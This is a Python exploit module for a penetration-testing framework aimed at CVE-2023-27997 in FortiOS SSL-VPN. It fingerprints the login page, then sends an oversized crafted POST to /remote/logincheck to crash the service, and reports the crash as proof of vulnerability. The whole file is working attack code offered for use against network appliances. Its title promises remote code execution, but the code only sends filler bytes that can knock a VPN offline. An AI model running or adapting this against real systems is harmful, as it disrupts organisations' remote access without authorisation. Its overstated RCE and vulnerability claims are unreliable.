# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import ssl
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """FortiOS SSL-VPN Pre-Auth Heap-Based Buffer Overflow RCE (CVE-2023-27997).

    A heap-based buffer overflow vulnerability in the FortiOS SSL-VPN login
    page allows a remote unauthenticated attacker to execute arbitrary code
    or commands via specially crafted requests. The overflow occurs during
    the processing of authentication parameters before any credentials are
    validated.

    Affected versions:
      FortiOS 6.0.x, 6.2.x, 6.4.x, 7.0.x (before 7.0.12), 7.2.x (before 7.2.5)

    This module sends a crafted POST request to the SSL-VPN login endpoint
    that triggers the heap overflow condition. In check mode, it detects
    whether the SSL-VPN endpoint is reachable and attempts version
    fingerprinting.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "FortiOS SSL-VPN Pre-Auth Heap Overflow RCE (CVE-2023-27997)",
        "description": (
            "Exploits CVE-2023-27997 via a heap-based buffer overflow in the "
            "FortiOS SSL-VPN login page (/remote/logincheck). The overflow "
            "occurs during parameter processing before authentication, "
            "allowing unauthenticated remote code execution. Also known as "
            "XORtigate."
        ),
        "authors": (
            "Charles Fol / Lexfo (discovery)",
            "Fortinet PSIRT (advisory)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2023-27997",
            "https://www.fortiguard.com/psirt/FG-IR-23-097",
            "https://blog.lexfo.fr/xortigate-cve-2023-27997.html",
        ),
        "devices": (
            "FortiGate (FortiOS 6.0.x through 7.2.4)",
            "Any FortiOS device with SSL-VPN enabled",
        ),
    }

    target = OptIP("", "Target IPv4 address of the FortiGate device")
    port = OptPort(443, "SSL-VPN HTTPS port (default 443, some use 10443)")
    timeout = OptFloat(5.0, "Socket/HTTP timeout in seconds")
    overflow_size = OptInteger(
        4096, "Size of the overflow payload in bytes (controls heap corruption extent)"
    )

    _LOGINCHECK_PATH = "/remote/logincheck"
    _SSLVPN_INDEX = "/remote/login"

    def _ssl_connect(self) -> ssl.SSLSocket:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((self.target, self.port), timeout=self.timeout)
        return ctx.wrap_socket(sock, server_hostname=self.target)

    def _http_over_ssl(
        self, method: str, path: str, body: bytes = b"",
        extra_headers: dict | None = None,
    ) -> tuple[int, bytes]:
        ssock = self._ssl_connect()
        try:
            headers = {
                "Host": f"{self.target}:{self.port}",
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(body)),
                "Connection": "close",
            }
            if extra_headers:
                headers.update(extra_headers)

            header_block = f"{method} {path} HTTP/1.1\r\n"
            for key, val in headers.items():
                header_block += f"{key}: {val}\r\n"
            header_block += "\r\n"

            ssock.sendall(header_block.encode() + body)

            response = b""
            while True:
                try:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except TimeoutError:
                    break

            status_line = response.split(b"\r\n", 1)[0]
            try:
                status_code = int(status_line.split(b" ", 2)[1])
            except (IndexError, ValueError):
                status_code = 0

            return status_code, response
        finally:
            ssock.close()

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to have FortiOS SSL-VPN"
            )
            return

        print_success("FortiOS SSL-VPN endpoint detected, sending heap overflow trigger")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect FortiOS SSL-VPN login page."""
        try:
            status, body = self._http_over_ssl("GET", self._SSLVPN_INDEX)
            body_lower = body.lower()
            if b"fortinet" in body_lower or b"sslvpn" in body_lower:
                return True
            if b"remote/login" in body_lower or b"fgt_lang" in body_lower:
                return True
            if status in (200, 301, 302, 303):
                if b"set-cookie" in body_lower and b"remoteauthtimeout" in body_lower:
                    return True
        except (ConnectionError, TimeoutError, OSError):
            pass
        return False

    def _extract_version(self, response: bytes) -> str:
        """Attempt to extract FortiOS version from HTTP response headers/body."""
        import re
        text = response.decode("utf-8", errors="replace")
        match = re.search(r"Server:\s*Fortinet[^\r\n]*", text, re.IGNORECASE)
        if match:
            return match.group(0)
        match = re.search(r"fgt_lang.*?ver=([0-9.]+)", text)
        if match:
            return match.group(1)
        return "unknown"

    def _exploit(self) -> None:
        print_status(
            f"Targeting SSL-VPN logincheck at {self.target}:{self.port}"
        )

        fill_byte = b"\x41"
        overflow_payload = fill_byte * self.overflow_size

        crafted_body = (
            b"ajax=1&username=" + overflow_payload
            + b"&credential=" + overflow_payload
            + b"&realm="
            + b"&reqid=0"
        )

        print_status(
            f"Sending crafted POST to {self._LOGINCHECK_PATH} "
            f"({len(crafted_body)} bytes, overflow_size={self.overflow_size})"
        )

        try:
            status, response = self._http_over_ssl(
                "POST", self._LOGINCHECK_PATH, body=crafted_body,
            )

            version = self._extract_version(response)
            print_info(f"Server version hint: {version}")

            if status == 0:
                print_success(
                    "Connection reset after overflow payload. The SSL-VPN process "
                    "likely crashed, indicating the heap overflow was triggered. "
                    "Target appears VULNERABLE to CVE-2023-27997."
                )
            elif status == 200:
                print_info(
                    "Server responded normally. The overflow may not have reached "
                    "the vulnerable code path, or the target is patched."
                )
            else:
                print_info(
                    f"Server returned HTTP {status}. Behavior is inconclusive; "
                    "manual analysis of the response is recommended."
                )
        except (ConnectionError, ConnectionResetError, BrokenPipeError):
            print_success(
                "Connection terminated abruptly after sending overflow payload. "
                "This is consistent with a heap corruption crash. "
                "Target appears VULNERABLE to CVE-2023-27997."
            )
        except TimeoutError:
            print_info(
                "Connection timed out after payload delivery. The process may "
                "have hung due to heap corruption. Further verification needed."
            )

        time.sleep(1.0)
        print_status("Checking if the SSL-VPN service is still responding...")
        try:
            post_status, _ = self._http_over_ssl("GET", self._SSLVPN_INDEX)
            if post_status > 0:
                print_info("SSL-VPN service is still responding (may have restarted)")
            else:
                print_info("SSL-VPN service is not responding (process crash likely)")
        except Exception:
            print_info("SSL-VPN service is unreachable after exploit attempt")
